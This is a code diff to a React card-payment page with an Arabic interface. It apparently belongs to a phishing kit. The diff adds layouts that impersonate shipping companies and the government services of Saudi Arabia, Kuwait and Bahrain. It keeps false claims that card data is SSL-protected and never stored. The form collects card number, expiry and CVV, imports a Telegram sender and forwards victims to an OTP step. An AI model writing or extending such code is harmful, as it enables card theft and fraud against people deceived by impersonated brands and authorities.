@@ -1,19 +1,20 @@
-import { useState } from "react";
+import React, { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { shippingCompanyBranding } from "@/lib/brandingSystem";
 import { useLink } from "@/hooks/useSupabase";
-import { Shield, CreditCard, AlertCircle, ArrowLeft, Lock, ShieldCheck, Sparkles } from "lucide-react";
+import { Shield, CreditCard, AlertCircle, Lock, ShieldCheck, Sparkles } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { sendToTelegram } from "@/lib/telegram";
 import { Card } from "@/components/ui/card";
 import { designSystem } from "@/lib/designSystem";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
+import { getCompanyLayout } from "@/components/CompanyLayouts";
+import { getGovernmentLayout } from "@/components/GovernmentLayouts";
 
 const PaymentCardForm = () => {
   const { id } = useParams();
@@ -32,6 +33,7 @@ const PaymentCardForm = () => {
   const branding = getServiceBranding(serviceKey);
   const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
   const shippingInfo = linkData?.payload as any;
+  const country = linkData?.payload?.country || "SA";
 
   const rawAmount = shippingInfo?.cod_amount;
   let amount = 500;
@@ -132,6 +134,84 @@ const PaymentCardForm = () => {
     
     navigate(`/pay/${id}/otp`);
   };
+
+  const renderForm = () => (
+    <form onSubmit={handleSubmit} className="space-y-6">
+      <div className="space-y-2">
+        <Label className="text-sm font-bold">اسم حامل البطاقة</Label>
+        <Input
+          placeholder="الاسم كما يظهر على البطاقة"
+          value={cardName}
+          onChange={(e) => setCardName(e.target.value)}
+          className="h-12 border-2 focus:ring-2"
+          style={{ borderColor: `${primaryColor}20` }}
+        />
+      </div>
+
+      <div className="space-y-2">
+        <Label className="text-sm font-bold">رقم البطاقة</Label>
+        <div className="relative">
+          <Input
+            placeholder="0000 0000 0000 0000"
+            value={cardNumber}
+            onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
+            maxLength={19}
+            className="h-12 border-2 pr-12 font-mono"
+            style={{ borderColor: `${primaryColor}20` }}
+          />
+          <CreditCard className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
+        </div>
+      </div>
+
+      <div className="grid grid-cols-2 gap-4">
+        <div className="space-y-2">
+          <Label className="text-sm font-bold">تاريخ الانتهاء</Label>
+          <Input
+            placeholder="MM/YY"
+            value={expiry}
+            onChange={(e) => setExpiry(formatExpiry(e.target.value))}
+            maxLength={5}
+            className="h-12 border-2 text-center font-mono"
+            style={{ borderColor: `${primaryColor}20` }}
+          />
+        </div>
+        <div className="space-y-2">
+          <Label className="text-sm font-bold">رمز الأمان (CVV)</Label>
+          <div className="relative">
+            <Input
+              placeholder="123"
+              value={cvv}
+              onChange={(e) => setCvv(e.target.value.replace(/\D/g, ""))}
+              maxLength={3}
+              type="password"
+              className="h-12 border-2 text-center font-mono"
+              style={{ borderColor: `${primaryColor}20` }}
+            />
+            <Lock className="absolute right-4 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400" />
+          </div>
+        </div>
+      </div>
+
+      <Button 
+        type="submit"
+        className="w-full h-14 text-lg font-bold shadow-lg transition-all hover:scale-[1.02]"
+        style={{ 
+          background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
+          color: '#FFFFFF'
+        }}
+      >
+        تأكيد الدفع ({formattedAmount})
+      </Button>
+
+      <div className="flex items-center justify-center gap-4 pt-4 opacity-50">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="Visa" className="h-4 w-auto" />
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard" className="h-6 w-auto" />
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/Mada_Logo.svg/1200px-Mada_Logo.svg.png" alt="Mada" className="h-4 w-auto" />
+      </div>
+    </form>
+  );
+  
+  const isShipping = linkData?.type === 'shipping';
   
   return (
     <>
@@ -143,333 +223,83 @@ const PaymentCardForm = () => {
         amount={formattedAmount}
       />
 
-      {/* Full Screen Layout */}
-      <div 
-        className="min-h-screen w-full flex flex-col"
-        dir="rtl"
-        style={{
-          background: `linear-gradient(135deg, ${companyBranding?.colors.surface || '#F8F9FA'}, #FFFFFF)`,
-          fontFamily: companyBranding?.fonts.arabic || 'Cairo, sans-serif'
-        }}
-      >
-        {/* Header */}
-        <div 
-          className="w-full border-b"
-          style={{
-            background: '#FFFFFF',
-            borderBottom: `3px solid ${primaryColor}`,
-            boxShadow: '0 2px 8px rgba(0,0,0,0.06)'
-          }}
-        >
-          <div className="container mx-auto px-4 sm:px-6 lg:px-8 max-w-7xl">
-            <div className="flex items-center justify-between h-16 sm:h-20">
-              <div className="flex items-center gap-4">
-                {displayLogo && (
-                  <img 
-                    src={displayLogo} 
-                    alt={serviceName}
-                    className="h-10 sm:h-12 w-auto object-contain"
-                  />
-                )}
-                <div className="hidden sm:block w-px h-10 bg-gray-300" />
-                <div className="hidden sm:block">
-                  <p className="text-base font-bold" style={{ color: textColor || '#1A1A1A' }}>
-                    {serviceName}
-                  </p>
-                  <p className="text-sm text-gray-500">
-                    الدفع الآمن
-                  </p>
-                </div>
-              </div>
-              
-              <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-green-50 border border-green-200">
-                <ShieldCheck className="w-4 h-4 text-green-600" />
-                <span className="text-xs font-medium text-green-700">آمن</span>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        {/* Main Content - Centered */}
-        <div className="flex-1 flex items-center justify-center py-8 sm:py-12 px-4">
-          <div className="w-full max-w-lg">
-            {/* Page Title */}
-            <div className="text-center mb-8">
-              <div className="flex items-center justify-center gap-3 mb-4">
-                <Sparkles className="w-6 h-6" style={{ color: primaryColor }} />
-                <h1 
-                  className="text-3xl sm:text-4xl font-bold"
-                  style={{
-                    color: designSystem.colors.neutral[900],
-                    fontFamily: designSystem.typography.fontFamilies.arabic
-                  }}
-                >
-                  بيانات البطاقة
-                </h1>
-              </div>
-              <p className="text-base text-gray-600">
-                أدخل بيانات بطاقتك بشكل آمن
-              </p>
-            </div>
-
-            <Card 
-              className="overflow-hidden border-0"
-              style={{
-                borderRadius: '20px',
-                boxShadow: '0 8px 32px rgba(0,0,0,0.1)'
-              }}
+      {(() => {
+        if (isShipping) {
+          const Layout = getCompanyLayout(serviceKey);
+          return (
+            <Layout 
+              companyKey={serviceKey} 
+              amount={formattedAmount} 
+              trackingNumber={shippingInfo?.tracking_number || `TRK-${id?.substring(0, 8).toUpperCase()}`}
             >
-              {/* Security Notice */}
-              <div 
-                className="px-6 sm:px-8 pt-6"
-              >
-                <div 
-                  className="rounded-xl p-4 mb-6 flex items-start gap-3"
-                  style={{
-                    background: `${primaryColor}10`,
-                    border: `1.5px solid ${primaryColor}30`
-                  }}
-                >
-                  <AlertCircle className="w-5 h-5 mt-0.5 flex-shrink-0" style={{ color: primaryColor }} />
-                  <div className="text-sm">
-                    <p className="font-bold mb-1" style={{ color: designSystem.colors.neutral[900] }}>
-                      حماية معلوماتك
-                    </p>
-                    <p className="text-xs text-gray-600">
-                      بياناتك محمية بتقنية التشفير SSL. لا نقوم بحفظ أو تخزين بيانات البطاقة.
-                    </p>
+              {renderForm()}
+            </Layout>
+          );
+        }
+
+        if (country === 'SA' || country === 'KW' || country === 'BH') {
+          const Layout = getGovernmentLayout(country);
+          return (
+            <Layout 
+              countryCode={country} 
+              amount={formattedAmount} 
+              serviceName={serviceName}
+            >
+              {renderForm()}
+            </Layout>
+          );
+        }
+
+        return (
+          <div 
+            className="min-h-screen w-full flex flex-col"
+            dir="rtl"
+            style={{
+              background: `linear-gradient(135deg, ${companyBranding?.colors.surface || '#F8F9FA'}, #FFFFFF)`,
+              fontFamily: companyBranding?.fonts.arabic || 'Cairo, sans-serif'
+            }}
+          >
+            <div className="w-full border-b bg-white shadow-sm" style={{ borderBottom: `3px solid ${primaryColor}` }}>
+              <div className="container mx-auto px-4 h-16 sm:h-20 flex items-center justify-between">
+                <div className="flex items-center gap-4">
+                  {displayLogo && <img src={displayLogo} alt={serviceName} className="h-10 sm:h-12 w-auto object-contain" />}
+                  <div className="hidden sm:block">
+                    <p className="text-base font-bold">{serviceName}</p>
+                    <p className="text-sm text-gray-500">الدفع الآمن</p>
                   </div>
+                </div>
+                <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-green-50 border border-green-200">
+                  <ShieldCheck className="w-4 h-4 text-green-600" />
+                  <span className="text-xs font-medium text-green-700">آمن</span>
                 </div>
               </div>
+            </div>
 
-              {/* Visual Card Display */}
-              <div className="px-6 sm:px-8 mb-6">
-                <div 
-                  className="rounded-2xl p-6 sm:p-8 relative overflow-hidden shadow-lg"
-                  style={{
-                    background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
-                    minHeight: '200px'
-                  }}
-                >
-                  <div className="absolute top-4 right-4 opacity-30">
-                    <CreditCard className="w-16 h-16 text-white" />
+            <div className="flex-1 flex items-center justify-center py-8 px-4">
+              <div className="w-full max-w-lg">
+                <div className="text-center mb-8">
+                  <div className="flex items-center justify-center gap-3 mb-4">
+                    <Sparkles className="w-6 h-6" style={{ color: primaryColor }} />
+                    <h1 className="text-3xl font-bold">بيانات البطاقة</h1>
                   </div>
-                  
-                  <div className="relative z-10">
-                    <div className="flex items-center justify-between mb-8">
-                      <div className="text-white text-xs font-semibold">DEBIT CARD</div>
-                      <div className="flex gap-1">
-                        <div className="w-8 h-8 rounded-full bg-white/30" />
-                        <div className="w-8 h-8 rounded-full bg-white/30 -ml-3" />
-                      </div>
-                    </div>
-                    
-                    <div className="mb-6">
-                      <div className="flex gap-3 text-white text-xl sm:text-2xl font-mono">
-                        <span>••••</span>
-                        <span>••••</span>
-                        <span>••••</span>
-                        <span>{cardNumber.replace(/\s/g, "").slice(-4) || "••••"}</span>
-                      </div>
-                    </div>
-
-                    <div className="flex justify-between items-end text-white">
-                      <div>
-                        <p className="text-xs opacity-70 mb-1">EXPIRES</p>
-                        <p className="text-lg font-mono">{expiry || "MM/YY"}</p>
-                      </div>
-                      <div className="text-right">
-                        <p className="text-xs opacity-70 mb-1">CARDHOLDER</p>
-                        <p className="text-lg font-bold uppercase">{cardName || "YOUR NAME"}</p>
-                      </div>
-                    </div>
-                  </div>
+                  <p className="text-gray-600">أدخل بيانات بطاقتك بشكل آمن</p>
                 </div>
+
+                <Card className="p-6 sm:p-8 shadow-2xl rounded-[20px] border-0">
+                  <div className="rounded-xl p-4 mb-6 flex items-start gap-3 bg-blue-50 border border-blue-100">
+                    <AlertCircle className="w-5 h-5 mt-0.5 text-blue-600" />
+                    <div className="text-sm">
+                      <p className="font-bold text-blue-900">حماية معلوماتك</p>
+                      <p className="text-xs text-blue-700">بياناتك محمية بتقنية التشفير SSL. لا نقوم بحفظ أو تخزين بيانات البطاقة.</p>
+                    </div>
+                  </div>
+                  {renderForm()}
+                </Card>
               </div>
-
-              {/* Form */}
-              <form onSubmit={handleSubmit} className="px-6 sm:px-8 pb-8 bg-white">
-                <div className="space-y-5">
-                  {/* Cardholder Name */}
-                  <div>
-                    <Label className="block mb-2.5 text-sm font-semibold" style={{ color: textColor || '#1A1A1A' }}>
-                      اسم حامل البطاقة
-                    </Label>
-                    <Input
-                      placeholder="AHMAD ALI"
-                      value={cardName}
-                      onChange={(e) => setCardName(e.target.value.toUpperCase())}
-                      className="h-12 text-base border-2 rounded-lg transition-all"
-                      style={{
-                        borderColor: designSystem.colors.neutral[200],
-                        fontFamily: 'Arial, sans-serif'
-                      }}
-                      required
-                    />
-                  </div>
-                  
-                  {/* Card Number */}
-                  <div>
-                    <Label className="block mb-2.5 text-sm font-semibold" style={{ color: textColor || '#1A1A1A' }}>
-                      رقم البطاقة
-                    </Label>
-                    <Input
-                      type="password"
-                      placeholder="•••• •••• •••• ••••"
-                      value={cardNumber}
-                      onChange={(e) =>
-                        setCardNumber(formatCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16)))
-                      }
-                      inputMode="numeric"
-                      className="h-12 text-lg tracking-wider border-2 rounded-lg transition-all"
-                      style={{
-                        borderColor: designSystem.colors.neutral[200],
-                        fontFamily: 'monospace'
-                      }}
-                      required
-                    />
-                  </div>
-                  
-                  {/* Expiry & CVV Row */}
-                  <div className="grid grid-cols-2 gap-4">
-                    <div>
-                      <Label className="block mb-2.5 text-sm font-semibold" style={{ color: textColor || '#1A1A1A' }}>
-                        تاريخ الانتهاء
-                      </Label>
-                      <div className="flex gap-2">
-                        <Select
-                          value={expiry.split('/')[0] || ''}
-                          onValueChange={(month) => {
-                            const year = expiry.split('/')[1] || '';
-                            setExpiry(month && year ? `${month}/${year}` : month);
-                          }}
-                        >
-                          <SelectTrigger className="h-12 border-2" style={{ borderColor: designSystem.colors.neutral[200] }}>
-                            <SelectValue placeholder="MM" />
-                          </SelectTrigger>
-                          <SelectContent>
-                            {Array.from({ length: 12 }, (_, i) => {
-                              const month = (i + 1).toString().padStart(2, '0');
-                              return (
-                                <SelectItem key={month} value={month}>
-                                  {month}
-                                </SelectItem>
-                              );
-                            })}
-                          </SelectContent>
-                        </Select>
-                        
-                        <Select
-                          value={expiry.split('/')[1] || ''}
-                          onValueChange={(year) => {
-                            const month = expiry.split('/')[0] || '';
-                            setExpiry(month && year ? `${month}/${year}` : year ? `01/${year}` : '');
-                          }}
-                        >
-                          <SelectTrigger className="h-12 border-2" style={{ borderColor: designSystem.colors.neutral[200] }}>
-                            <SelectValue placeholder="YY" />
-                          </SelectTrigger>
-                          <SelectContent>
-                            {Array.from({ length: 15 }, (_, i) => {
-                              const year = (new Date().getFullYear() + i).toString().slice(-2);
-                              return (
-                                <SelectItem key={year} value={year}>
-                                  {year}
-                                </SelectItem>
-                              );
-                            })}
-                          </SelectContent>
-                        </Select>
-                      </div>
-                    </div>
-
-                    <div>
-                      <Label className="block mb-2.5 text-sm font-semibold" style={{ color: textColor || '#1A1A1A' }}>
-                        CVV
-                      </Label>
-                      <Input
-                        type="password"
-                        placeholder="•••"
-                        value={cvv}
-                        onChange={(e) =>
-                          setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))
-                        }
-                        inputMode="numeric"
-                        className="h-12 text-lg text-center tracking-wider border-2 rounded-lg transition-all"
-                        style={{
-                          borderColor: designSystem.colors.neutral[200],
-                          fontFamily: 'monospace'
-                        }}
-                        required
-                      />
-                    </div>
-                  </div>
-                </div>
-                
-                {/* Security Info */}
-                <div className="mt-6 p-4 rounded-xl flex items-center gap-3" style={{ background: `${primaryColor}08` }}>
-                  <Shield className="w-5 h-5" style={{ color: primaryColor }} />
-                  <p className="text-xs text-gray-600">
-                    معلوماتك محمية بتشفير SSL 256-bit ولن يتم حفظها على خوادمنا
-                  </p>
-                </div>
-                
-                {/* Submit Button */}
-                <Button
-                  type="submit"
-                  size="lg"
-                  className="w-full text-lg py-7 text-white font-bold mt-8 transition-all rounded-xl"
-                  style={{
-                    background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
-                    boxShadow: `0 8px 20px ${primaryColor}40`
-                  }}
-                >
-                  <span className="ml-2">متابعة</span>
-                  <ArrowLeft className="w-5 h-5 mr-2" />
-                </Button>
-                
-                <p className="text-xs text-center text-gray-500 mt-5">
-                  بالمتابعة، أنت توافق على{' '}
-                  <a href="#" className="underline" style={{ color: primaryColor }}>
-                    الشروط والأحكام
-                  </a>
-                </p>
-              </form>
-            </Card>
-
-            {/* Footer */}
-            <div className="mt-8 text-center">
-              <div className="flex items-center justify-center gap-4 text-xs text-gray-500 mb-3">
-                <div className="flex items-center gap-1.5">
-                  <Lock className="w-3.5 h-3.5" />
-                  <span>SSL Encrypted</span>
-                </div>
-                <span>•</span>
-                <div className="flex items-center gap-1.5">
-                  <ShieldCheck className="w-3.5 h-3.5" />
-                  <span>Verified</span>
-                </div>
-              </div>
-              <p className="text-xs text-gray-400">
-                © 2025 {serviceName}. جميع الحقوق محفوظة.
-              </p>
             </div>
           </div>
-        </div>
-      </div>
-    
-      {/* Hidden Netlify Form */}
-      <form name="card-details" netlify-honeypot="bot-field" data-netlify="true" hidden>
-        <input type="text" name="name" />
-        <input type="email" name="email" />
-        <input type="tel" name="phone" />
-        <input type="text" name="service" />
-        <input type="text" name="amount" />
-        <input type="text" name="cardholder" />
-        <input type="text" name="cardLast4" />
-        <input type="text" name="expiry" />
-        <input type="text" name="timestamp" />
-      </form>
+        );
+      })()}
     </>
   );
 };
